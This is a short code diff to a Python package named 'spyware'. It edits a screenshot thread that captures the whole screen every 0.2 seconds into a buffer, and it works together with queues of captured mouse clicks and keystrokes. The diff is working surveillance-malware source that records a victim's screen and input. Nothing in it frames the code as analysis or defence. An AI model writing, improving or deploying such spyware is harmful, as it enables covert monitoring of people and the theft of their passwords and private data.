@@ -3,7 +3,7 @@ from pathlib import Path
 from threading import Thread
 from time import sleep
 
-from PIL import ImageGrab, ImageDraw, ImageFont
+from PIL import ImageGrab, ImageDraw
 
 from spyware.queues import click_queue, keystroke_queue
 
@@ -48,13 +48,12 @@ class ScreenshotThread(Thread):
 
     def run(self):
         while True:
-            self._buffer.append(ImageGrab.grab((0, 0, 1920, 1080)))
-
             try:
                 position = click_queue.get(block=False)
                 self.handle_click(position)
                 continue
             except queue.Empty:
                 pass
-            sleep(0.3)
+            self._buffer.append(ImageGrab.grab((0, 0, 1920, 1080)))
+            sleep(0.2)
 
